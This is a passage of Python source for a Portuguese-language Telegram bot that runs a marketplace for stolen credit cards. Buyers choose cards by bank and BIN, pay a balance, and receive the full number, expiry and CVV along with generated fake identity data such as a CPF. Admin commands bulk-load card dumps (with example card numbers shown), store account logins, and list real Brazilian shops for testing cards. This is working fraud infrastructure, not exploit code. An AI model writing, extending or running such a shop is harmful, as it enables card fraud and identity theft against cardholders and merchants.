    text += "🔥 𝕋𝕆𝔻𝔸𝕊 𝔾𝔾𝕊 𝔼𝕊𝕋𝔸𝕆 𝕃𝕀𝕍𝔼 ✅\n\n"
    text += "🌐 𝕊𝕀𝕋𝔼𝕊 ℙ𝔸ℝ𝔸 𝕋𝔼𝕊𝕋𝔼 𝕄𝔸ℕ𝕌𝔸𝕀𝕊\n"
    text += "• https://www.divvino.com.br\n"
    text += "• https://www.drogalider.com.br\n"
    text += "• https://loja.magiccity.com.br/\n\n"
    text += "⚠️ 𝕋𝔼𝕊𝕋𝔸 𝔼 𝕄𝔸ℕ𝔻𝔸 ℙℝ𝕀ℕ𝕋 𝕋ℝ𝕆ℂ𝔸𝕄𝕆𝕊 𝔸ℙ𝔼ℕ𝔸𝕊 𝔾𝔾𝕊 𝔻𝕀𝔼 𝕆𝕂\n"
    text += "🚫 𝕊𝔼 ℕ𝔸𝕆 𝕊𝔸𝔹𝔼 𝕌𝕊𝔸ℝ ℕ𝔸𝕆 ℂ𝕆𝕄ℙℝ𝔼 ❌\n\n"
    text += "Escolha uma opção abaixo:"

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM bot_settings WHERE key = ?',
                   ('main_photo', ))
    photo_result = cursor.fetchone()
    conn.close()

    try:
        if photo_result:
            await query.edit_message_caption(caption=text,
                                             reply_markup=reply_markup,
                                             parse_mode='Markdown')
        else:
            await query.edit_message_text(text,
                                          reply_markup=reply_markup,
                                          parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        if photo_result:
            await context.bot.send_photo(chat_id=query.from_user.id,
                                         photo=photo_result[0],
                                         caption=text,
                                         reply_markup=reply_markup,
                                         parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text,
                                           reply_markup=reply_markup,
                                           parse_mode='Markdown')

async def show_banks(query, context):
    banks = get_banks()
    if not banks:
        text = "❌ Nenhum cartão disponível no momento!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text)
        return

    keyboard = []
    for bank_data in banks:
        bank_name = bank_data['name']
        card_count = bank_data['count']

        keyboard.append([
            InlineKeyboardButton(f"🏦 {bank_name} ({card_count} CCs)",
                                 callback_data=f"bank_{bank_name}")
        ])

    keyboard.append(
        [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "🏦 **Selecione um Banco:**"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_bank_bins(query, context, bank_name: str):
    bins = get_bins_by_bank(bank_name)
    if not bins:
        text = "❌ Nenhum cartão disponível para este banco!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text)
        return

    keyboard = []
    for bin_data in bins:
        bin_code = bin_data['bin']
        card_count = bin_data['count']
        price = get_bin_price(bin_code)

        keyboard.append([
            InlineKeyboardButton(
                f"💳 {bin_code} ({card_count} CCs) - R$ {price:.2f}",
                callback_data=f"bin_{bin_code}")
        ])

    keyboard.append(
        [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_banks")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = f"🏦 **{bank_name}**\n\n💳 **Selecione uma BIN:**"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_bin_cards(query, context, bin_code: str, page: int):
    cards = get_cards_by_bin(bin_code)
    if not cards:
        text = "❌ Nenhum cartão disponível para esta BIN!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text)
        return

    if page >= len(cards):
        page = 0
    elif page < 0:
        page = len(cards) - 1

    card = cards[page]
    price = get_bin_price(bin_code)
    bank_name = get_bank_name(bin_code)

    masked_number = f"{card['number'][:6]}••••••••••"

    text = f"🏦 **{bank_name}**\n"
    text += f"💳 **BIN: {bin_code}**\n\n"
    text += f"**Cartão {page + 1} de {len(cards)}**\n"
    text += f"**Número:** `{masked_number}`\n"
    text += f"**Validade:** `{card['month']}/{card['year']}`\n\n"
    text += f"**Preço:** R$ {price:.2f}"

    keyboard = []

    if len(cards) > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(
                InlineKeyboardButton(
                    "⬅️", callback_data=f"card_{bin_code}_{page-1}"))
        nav_buttons.append(
            InlineKeyboardButton(f"{page+1}/{len(cards)}",
                                 callback_data="noop"))
        if page < len(cards) - 1:
            nav_buttons.append(
                InlineKeyboardButton(
                    "➡️", callback_data=f"card_{bin_code}_{page+1}"))
        keyboard.append(nav_buttons)

    keyboard.append([
        InlineKeyboardButton(f"💰 Comprar por R$ {price:.2f}",
                             callback_data=f"buy_{bin_code}_{page}")
    ])

    keyboard.append([
        InlineKeyboardButton("🔙 Voltar",
                             callback_data=f"back_to_bank_{bank_name}")
    ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def process_purchase(query, context):
    parts = query.data.split("_", 2)
    bin_code = parts[1]
    page = int(parts[2])

    user_data = get_user(query.from_user.id)
    price = get_bin_price(bin_code)

    if user_data['balance'] < price:
        text = f"❌ Saldo insuficiente!\n" \
               f"Preço: R$ {price:.2f}\n" \
               f"Seu saldo: R$ {user_data['balance']:.2f}"

        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text)
        return

    cards = get_cards_by_bin(bin_code)
    if page >= len(cards):
        text = "❌ Cartão não disponível!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text)
        return

    card = cards[page]
    bank_name = get_bank_name(bin_code)

    fake_data = generate_fake_data()

    update_balance(query.from_user.id, -price)
    mark_card_sold(card['number'])

    try:
        group_text = f"💳 **COMPRA REALIZADA**\n\n"
        group_text += f"**ID:** {query.from_user.id}\n"
        group_text += f"**Nome:** {query.from_user.first_name}\n"
        group_text += f"**Banco:** {bank_name}\n"
        group_text += f"**BIN:** {bin_code}\n"
        group_text += f"**Valor:** R$ {price:.2f}"

        # Obter o chat_id do grupo pelo username
        chat = await context.bot.get_chat(GROUP_USERNAME)
        await context.bot.send_message(chat_id=chat.id,
                                       text=group_text,
                                       parse_mode='Markdown')
    except Exception as e:
        print(f"Erro ao enviar para grupo: {e}")

    card_image = generate_3d_card(card, user_data, fake_data)

    card_caption = f"✅ **COMPRA APROVADA!**\n\n"
    card_caption += f"💳 **SEU CARTÃO 3D**\n"
    card_caption += f"**Banco:** {bank_name}\n"
    card_caption += f"**BIN:** {bin_code}\n"
    card_caption += f"**Valor cobrado:** R$ {price:.2f}\n"
    card_caption += f"**Saldo restante:** R$ {user_data['balance'] - price:.2f}"

    try:
        await query.message.delete()
        await context.bot.send_photo(chat_id=query.from_user.id,
                                     photo=card_image,
                                     caption=card_caption,
                                     parse_mode='Markdown')
    except Exception:
        await context.bot.send_photo(chat_id=query.from_user.id,
                                     photo=card_image,
                                     caption=card_caption,
                                     parse_mode='Markdown')

    card_text = f"📋 **DADOS COMPLETOS:**\n\n"
    card_text += f"💳 **CARTÃO:**\n"
    card_text += f"**Número:** `{card['number']}`\n"
    card_text += f"**Validade:** `{card['month']}/{card['year']}`\n"
    card_text += f"**CVV:** `{card['cvv']}`\n\n"
    card_text += f"👤 **DADOS AUXILIARES:**\n"
    card_text += f"**Nome:** {fake_data['name']}\n"
    card_text += f"**CPF:** {fake_data['cpf']}\n"
    card_text += f"**Nascimento:** {fake_data['birth_date']}\n"
    card_text += f"**Email:** {fake_data['email']}"

    await context.bot.send_message(chat_id=query.from_user.id,
                                   text=card_text,
                                   parse_mode='Markdown')

async def show_admin_panel(query, context):
    keyboard = [
        [
            InlineKeyboardButton("💰 Gerenciar Preços",
                                 callback_data="admin_prices")
        ],
        [
            InlineKeyboardButton("👥 Usuários", callback_data="admin_users"),
            InlineKeyboardButton("📊 Estatísticas", callback_data="admin_stats")
        ],
        [
            InlineKeyboardButton("💳 Gerenciar Saldo",
                                 callback_data="admin_balance")
        ],
        [InlineKeyboardButton("📢 Mensagens", callback_data="admin_messages")],
        [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "⚙️ **Painel Administrativo**\n\nEscolha uma opção:"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_balance_management(query, context):
    keyboard = [[
        InlineKeyboardButton("➕ Adicionar Saldo", callback_data="add_balance")
    ], [
        InlineKeyboardButton("➖ Remover Saldo", callback_data="remove_balance")
    ], [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_admin")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "💳 **Gerenciar Saldo de Usuários**\n\n"
    text += "Escolha uma ação:"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_message_management(query, context):
    keyboard = [[
        InlineKeyboardButton("📢 Enviar para Usuários",
                             callback_data="send_all_users")
    ], [
        InlineKeyboardButton("📢 Enviar para Grupo",
                             callback_data="send_group_msg")
    ], [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_admin")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "📢 **Gerenciar Mensagens**\n\n"
    text += "Escolha uma ação:"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_price_management(query, context):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
        SELECT DISTINCT bin FROM credit_cards WHERE is_sold = 0 ORDER BY bin
    ''')
    bins = cursor.fetchall()
    conn.close()

    if not bins:
        await query.edit_message_text("❌ Nenhuma BIN disponível!")
        return

    keyboard = []
    for bin_row in bins:
        bin_code = bin_row[0]
        price = get_bin_price(bin_code)
        bank_name = get_bank_name(bin_code)
        keyboard.append([
            InlineKeyboardButton(f"{bank_name} - {bin_code} - R$ {price:.2f}",
                                 callback_data=f"set_price_{bin_code}")
        ])

    keyboard.append(
        [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_admin")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        "💰 **Gerenciar Preços das BINs**\n\n"
        "Selecione uma BIN para alterar o preço:",
        reply_markup=reply_markup,
        parse_mode='Markdown')

async def show_user_management(query, context):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('SELECT COUNT(*) FROM users WHERE is_blocked = 0')
    active_users = cursor.fetchone()[0]

    cursor.execute('SELECT COUNT(*) FROM users WHERE is_blocked = 1')
    blocked_users = cursor.fetchone()[0]

    cursor.execute(
        'SELECT first_name, balance FROM users ORDER BY balance DESC LIMIT 3')
    top_users = cursor.fetchall()

    conn.close()

    text = "👥 **Gerenciamento de Usuários**\n\n"
    text += f"**Usuários Ativos:** {active_users}\n"
    text += f"**Usuários Bloqueados:** {blocked_users}\n\n"
    text += "🏆 **Top 3 Saldos:**\n"
    for i, (name, balance) in enumerate(top_users, 1):
        text += f"{i}. {name} - R$ {balance:.2f}\n"

    keyboard = [[
        InlineKeyboardButton("🔙 Voltar", callback_data="back_to_admin")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text,
                                  reply_markup=reply_markup,
                                  parse_mode='Markdown')

async def show_admin_stats(query, context):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()

    cursor.execute('SELECT COUNT(*) FROM credit_cards')
    total_cards = cursor.fetchone()[0]

    cursor.execute('SELECT COUNT(*) FROM credit_cards WHERE is_sold = 1')
    sold_cards = cursor.fetchone()[0]

    available_cards = total_cards - sold_cards

    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]

    cursor.execute('''
        SELECT bin, bank_name, COUNT(*) as count 
        FROM credit_cards 
        WHERE is_sold = 0 
        GROUP BY bin, bank_name 
        ORDER BY count DESC LIMIT 10
    ''')
    bins_stats = cursor.fetchall()

    conn.close()

    text = "📊 **Estatísticas do Bot**\n\n"
    text += f"**Total de Cartões:** {total_cards}\n"
    text += f"**Cartões Vendidos:** {sold_cards}\n"
    text += f"**Cartões Disponíveis:** {available_cards}\n"
    text += f"**Total de Usuários:** {total_users}\n\n"
    text += "🏦 **Top 10 BINs Disponíveis:**\n"

    for bin_code, bank_name, count in bins_stats:
        text += f"• {bank_name} - {bin_code}: {count}\n"

    keyboard = [[
        InlineKeyboardButton("🔙 Voltar", callback_data="back_to_admin")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(text,
                                  reply_markup=reply_markup,
                                  parse_mode='Markdown')

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle price setting, gift redemption, balance management, chat messages and other text messages"""

    user_id = update.effective_user.id
    
    # Verificar se o usuário está no grupo
    try:
        in_group = await check_user_in_group(context, user_id)
    except Exception as e:
        print(f"Erro ao verificar grupo: {e}")
        in_group = False

    if not in_group and user_id != ADMIN_ID:
        await update.message.reply_text(
            "❌ **ACESSO NEGADO**\n\n"
            "Para usar este bot, você precisa estar no nosso grupo oficial!",
            parse_mode='Markdown')
        return

    # NOVO: Removida a lógica de aguardar valor de depósito - agora vai direto para o PV

    if update.effective_user.id == ADMIN_ID and 'admin_action' in context.user_data:
        action = context.user_data['admin_action']

        if action == 'add_balance':
            try:
                parts = update.message.text.split()
                if len(parts) != 2:
                    await update.message.reply_text(
                        "❌ Formato inválido! Use: ID valor")
                    return

                user_id = int(parts[0])
                amount = float(parts[1])

                user_data = get_user(user_id)
                if not user_data:
                    await update.message.reply_text("❌ Usuário não encontrado!"
                                                    )
                    return

                update_balance(user_id, amount)
                del context.user_data['admin_action']

                await update.message.reply_text(
                    f"✅ **Saldo adicionado com sucesso!**\n\n"
                    f"**Usuário:** {user_data['first_name']} (ID: {user_id})\n"
                    f"**Valor adicionado:** R$ {amount:.2f}\n"
                    f"**Novo saldo:** R$ {get_user(user_id)['balance']:.2f}",
                    parse_mode='Markdown')

                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"💰 **Saldo Adicionado!**\n\n"
                        f"**Valor:** R$ {amount:.2f}\n"
                        f"**Novo saldo:** R$ {get_user(user_id)['balance']:.2f}",
                        parse_mode='Markdown')
                except:
                    pass

                return
            except ValueError:
                await update.message.reply_text(
                    "❌ Formato inválido! Use números válidos.")
                return

        elif action == 'remove_balance':
            try:
                parts = update.message.text.split()
                if len(parts) != 2:
                    await update.message.reply_text(
                        "❌ Formato inválido! Use: ID valor")
                    return

                user_id = int(parts[0])
                amount = float(parts[1])

                user_data = get_user(user_id)
                if not user_data:
                    await update.message.reply_text("❌ Usuário não encontrado!"
                                                    )
                    return

                if user_data['balance'] < amount:
                    await update.message.reply_text(
                        f"❌ Saldo insuficiente!\n"
                        f"Saldo atual: R$ {user_data['balance']:.2f}\n"
                        f"Valor a remover: R$ {amount:.2f}")
                    return

                update_balance(user_id, -amount)
                del context.user_data['admin_action']

                await update.message.reply_text(
                    f"✅ **Saldo removido com sucesso!**\n\n"
                    f"**Usuário:** {user_data['first_name']} (ID: {user_id})\n"
                    f"**Valor removido:** R$ {amount:.2f}\n"
                    f"**Novo saldo:** R$ {get_user(user_id)['balance']:.2f}",
                    parse_mode='Markdown')

                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"💸 **Saldo Removido!**\n\n"
                        f"**Valor:** R$ {amount:.2f}\n"
                        f"**Novo saldo:** R$ {get_user(user_id)['balance']:.2f}",
                        parse_mode='Markdown')
                except:
                    pass

                return
            except ValueError:
                await update.message.reply_text(
                    "❌ Formato inválido! Use números válidos.")
                return

        elif action == 'send_group_msg':
            message = update.message.text
            del context.user_data['admin_action']

            try:
                # Obter o chat_id do grupo pelo username
                chat = await context.bot.get_chat(GROUP_USERNAME)
                await context.bot.send_message(
                    chat_id=chat.id,
                    text=f"📢 **Mensagem do Admin:**\n\n{message}",
                    parse_mode='Markdown')
                await update.message.reply_text(
                    "✅ Mensagem enviada para o grupo com sucesso!")
            except Exception as e:
                await update.message.reply_text(
                    f"❌ Erro ao enviar mensagem: {str(e)}")
            return

        elif action == 'send_all_users':
            message = update.message.text
            del context.user_data['admin_action']

            conn = sqlite3.connect('bot_database.db')
            cursor = conn.cursor()
            cursor.execute('SELECT user_id FROM users')
            all_users = cursor.fetchall()
            conn.close()

            sent_count = 0
            failed_count = 0

            for user_row in all_users:
                user_id = user_row[0]
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=f"📢 **Mensagem do Admin:**\n\n{message}",
                        parse_mode='Markdown')
                    sent_count += 1
                    await asyncio.sleep(0.1)  # Evitar rate limiting
                except:
                    failed_count += 1

            await update.message.reply_text(
                f"✅ Mensagem enviada para {sent_count} usuários!\n"
                f"❌ Falhas: {failed_count}")
            return

    # Check if it's a gift code
    if len(update.message.text) == 8 and update.message.text.isalnum():
        code = update.message.text.upper()
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT amount, is_used FROM gifts WHERE code = ?',
                       (code, ))
        result = cursor.fetchone()

        if result:
            if result[1]:
                await update.message.reply_text("❌ Gift card já foi usado!")
                conn.close()
                return

            amount = result[0]
            cursor.execute(
                'UPDATE gifts SET is_used = 1, used_by = ? WHERE code = ?',
                (update.effective_user.id, code))
            conn.commit()
            conn.close()

            update_balance(update.effective_user.id, amount)

            try:
                group_text = f"🎁 **GIFT RESGATADO**\n\n"
                group_text += f"**ID:** {update.effective_user.id}\n"
                group_text += f"**Nome:** {update.effective_user.first_name}\n"
                group_text += f"**Código:** {code}\n"
                group_text += f"**Valor:** R$ {amount:.2f}"

                # Obter o chat_id do grupo pelo username
                chat = await context.bot.get_chat(GROUP_USERNAME)
                await context.bot.send_message(chat_id=chat.id,
                                               text=group_text,
                                               parse_mode='Markdown')
            except Exception as e:
                print(f"Erro ao enviar para grupo: {e}")

            await update.message.reply_text(
                f"✅ Gift resgatado com sucesso!\n"
                f"💰 Valor: R$ {amount:.2f}\n"
                f"💳 Novo saldo: R$ {get_user(update.effective_user.id)['balance']:.2f}"
            )
            return
        conn.close()

    # Handle admin price setting
    if update.effective_user.id == ADMIN_ID and 'setting_price_for' in context.user_data:
        try:
            new_price = float(update.message.text)
            bin_code = context.user_data['setting_price_for']
            set_bin_price(bin_code, new_price)
            del context.user_data['setting_price_for']

            await update.message.reply_text(
                f"✅ Preço da BIN {bin_code} atualizado para R$ {new_price:.2f}"
            )
        except ValueError:
            await update.message.reply_text(
                "❌ Valor inválido! Digite apenas números.")
        return

    # Handle adding logins via /lg command
    if update.message.text.startswith('/lg '):
        if update.effective_user.id != ADMIN_ID:
            await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
            return

        login_data = update.message.text[4:].strip()
        if not login_data:
            await update.message.reply_text(
                "❌ Use: /lg [login]\n\nExemplo: /lg user:password")
            return

        context.user_data['awaiting_login_category'] = login_data
        await update.message.reply_text(
            "📝 Qual a categoria deste login?\n\nExemplo: Amazon, Netflix, etc."
        )
        return

    # Await Login Category
    if 'awaiting_login_category' in context.user_data:
        category = update.message.text.strip()
        login = context.user_data['awaiting_login_category']
        user_id = update.effective_user.id

        if add_login(login, category, user_id):
            await update.message.reply_text(
                f"✅ Login adicionado com sucesso!\n\nLogin: `{login}`\nCategoria: {category}",
                parse_mode='Markdown')
        else:
            await update.message.reply_text(
                "❌ Erro ao adicionar login. Já existe ou formato inválido.")

        del context.user_data['awaiting_login_category']
        return

async def generate_pix_payment(update: Update, context: ContextTypes.DEFAULT_TYPE, amount: float):
    """Generate PIX payment - DESATIVADO: Agora usa depósito manual via PV"""
    pass

async def pix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PIX command - DESATIVADO: Agora usa depósito manual via PV"""
    if not await check_user_in_group(
            context,
            update.effective_user.id) and update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ **ACESSO NEGADO**\n\n"
            "Para usar este bot, você precisa estar no nosso grupo oficial!",
            parse_mode='Markdown')
        return

    # Redirecionar para depósito manual
    keyboard = [[
        InlineKeyboardButton("💬 Falar com @cybersecofc", url="https://t.me/cybersecofc")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = "💰 **DEPÓSITO MANUAL**\n\n"
    text += "Para depositar saldo:\n\n"
    text += "1️⃣ Clique no botão abaixo para falar com @cybersecofc\n"
    text += "2️⃣ Envie o comprovante do PIX\n"
    text += "3️⃣ Após confirmação, você receberá um GIFT CARD\n"
    text += "4️⃣ Use o código do gift no bot para resgatar o saldo\n\n"
    text += "⏱️ Seu saldo será adicionado em até 5 minutos!"
    
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

async def gift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        if not context.args:
            await update.message.reply_text("❌ Use: /gift [código]")
            return

        code = context.args[0].upper()
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('SELECT amount, is_used FROM gifts WHERE code = ?',
                       (code, ))
        result = cursor.fetchone()

        if not result:
            await update.message.reply_text("❌ Gift card inválido!")
            conn.close()
            return

        if result[1]:
            await update.message.reply_text("❌ Gift card já foi usado!")
            conn.close()
            return

        amount = result[0]
        cursor.execute(
            'UPDATE gifts SET is_used = 1, used_by = ? WHERE code = ?',
            (update.effective_user.id, code))
        conn.commit()
        conn.close()

        update_balance(update.effective_user.id, amount)

        try:
            group_text = f"🎁 **GIFT RESGATADO**\n\n"
            group_text += f"**ID:** {update.effective_user.id}\n"
            group_text += f"**Nome:** {update.effective_user.first_name}\n"
            group_text += f"**Código:** {code}\n"
            group_text += f"**Valor:** R$ {amount:.2f}"

            # Obter o chat_id do grupo pelo username
            chat = await context.bot.get_chat(GROUP_USERNAME)
            await context.bot.send_message(chat_id=chat.id,
                                               text=group_text,
                                               parse_mode='Markdown')
        except Exception as e:
            print(f"Erro ao enviar para grupo: {e}")

        await update.message.reply_text(
            f"✅ Gift resgatado com sucesso!\n"
            f"💰 Valor: R$ {amount:.2f}\n"
            f"💳 Novo saldo: R$ {get_user(update.effective_user.id)['balance']:.2f}"
        )
    else:
        if not context.args:
            await update.message.reply_text("❌ Use: /gift [valor]")
            return

        try:
            amount = float(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Valor inválido!")
            return

        code = ''.join(
            random.choices(string.ascii_uppercase + string.digits, k=8))

        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('INSERT INTO gifts (code, amount) VALUES (?, ?)',
                       (code, amount))
        conn.commit()
        conn.close()

        await update.message.reply_text(
            f"✅ Gift card criado!\n"
            f"**Código:** `{code}`\n"
            f"**Valor:** R$ {amount:.2f}",
            parse_mode='Markdown')

async def adc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    message_text = update.message.text
    if not message_text or len(message_text.split('\n')) < 1:
        await update.message.reply_text(
            "❌ Use: /adc [número]|[mês]|[ano]|[cvv]\n"
            "Exemplo: /adc 4066550036264486|10|2029|664\n\n"
            "💡 **Para adicionar múltiplos:**\n"
            "/adc 4066550036264486|10|2029|664\n"
            "4066550030057357|02|2028|347\n"
            "4066550032842244|12|2027|143")
        return

    lines = message_text.strip().split('\n')
    first_line = lines[0]
    if first_line.startswith('/adc '):
        first_card = first_line[5:].strip()
        cards_to_process = [first_card]
    else:
        await update.message.reply_text("❌ Comando inválido!")
        return

    for i in range(1, len(lines)):
        line = lines[i].strip()
        if line:
            cards_to_process.append(line)

    if not cards_to_process:
        await update.message.reply_text("❌ Nenhum cartão encontrado!")
        return

    results = []
    added_count = 0
    duplicate_count = 0
    error_count = 0

    for card_line in cards_to_process:
        try:
            card_data = card_line.split('|')
            if len(card_data) != 4:
                results.append(f"❌ Formato inválido: {card_line}")
                error_count += 1
                continue

            number, month, year, cvv = card_data
            bin_code = number[:6]
            bank_name = get_bank_name(bin_code)

            if add_credit_card(number, month, year, cvv):
                results.append(
                    f"✅ {bank_name} - {bin_code} - {number[:6]}••••••••••")
                added_count += 1
            else:
                results.append(f"🔴 DUPLICADO: {number[:6]}••••••••••")
                duplicate_count += 1

        except Exception as e:
            results.append(f"❌ Erro: {card_line}")
            error_count += 1

    summary = f"📊 **RESULTADO DA ADIÇÃO**\n\n"
    summary += f"✅ **Adicionados:** {added_count}\n"
    summary += f"🔴 **Duplicados:** {duplicate_count}\n"
    summary += f"❌ **Erros:** {error_count}\n\n"

    if len(results) <= 20:
        summary += "📋 **Detalhes:**\n"
        for result in results:
            summary += f"{result}\n"
    else:
        summary += f"📋 **Total processado:** {len(results)} cartões\n"
        summary += "✨ Muitos cartões para mostrar detalhes individuais"

    await update.message.reply_text(summary, parse_mode='Markdown')

async def show_profile(query, context):
    user_data = get_user(query.from_user.id)

    text = f"👤 **Seu Perfil**\n\n"
    text += f"**ID:** `{user_data['user_id']}`\n"
    text += f"**Nome:** {user_data['first_name']}\n"
    text += f"**Username:** @{user_data['username'] or 'N/A'}\n"
    text += f"**Saldo:** R$ {user_data['balance']:.2f}\n"
    text += f"**Membro desde:** {user_data['created_at'][:10]}"

    keyboard = [[
        InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def ft_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    await update.message.reply_text(
        "📸 Envie a foto que deseja usar como foto do menu principal:")
    context.user_data['waiting_for_photo'] = True

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id == ADMIN_ID and context.user_data.get(
            'waiting_for_photo'):
        photo = update.message.photo[-1].file_id
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute(
            'INSERT OR REPLACE INTO bot_settings (key, value) VALUES (?, ?)',
            ('main_photo', photo))
        conn.commit()
        conn.close()
        del context.user_data['waiting_for_photo']
        await update.message.reply_text("✅ Foto do menu principal atualizada!")

async def ms_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """MS command - send message to all users and groups"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    if not context.args:
        await update.message.reply_text(
            "❌ Use: /ms [mensagem]\n\n"
            "Exemplos:\n"
            "• /ms Olá, nova atualização disponível!\n"
            "• /ms 🎉 Promoção especial esta semana!"
        )
        return

    message_text = ' '.join(context.args)
    
    # Get all users
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id FROM users')
    all_users = cursor.fetchall()
    conn.close()

    sent_users = 0
    failed_users = 0
    
    # Send to all users
    for user_row in all_users:
        user_id = user_row[0]
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 **Mensagem do Admin:**\n\n{message_text}",
                parse_mode='Markdown'
            )
            sent_users += 1
            await asyncio.sleep(0.1)  # Avoid rate limiting
        except Exception:
            failed_users += 1
    
    # Get all chats the bot is in (this would require tracking)
    # For now, just send to the main group
    try:
        chat = await context.bot.get_chat(GROUP_USERNAME)
        await context.bot.send_message(
            chat_id=chat.id,
            text=f"📢 **Mensagem do Admin:**\n\n{message_text}",
            parse_mode='Markdown'
        )
        await update.message.reply_text(
            f"✅ Mensagem enviada com sucesso!\n\n"
            f"📨 **Usuários:** {sent_users} enviados, {failed_users} falhas\n"
            f"👥 **Grupo principal:** ✅ enviado"
        )
    except Exception as e:
        await update.message.reply_text(
            f"✅ Mensagem enviada para usuários!\n\n"
            f"📨 **Usuários:** {sent_users} enviados, {failed_users} falhas\n"
            f"❌ **Erro no grupo:** {str(e)}"
        )

async def ms_photo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """MS command for photos - send photo to all users and groups"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text(
            "❌ Apenas administradores podem usar este comando!")
        return

    if not update.message.caption or not update.message.caption.startswith('/ms '):
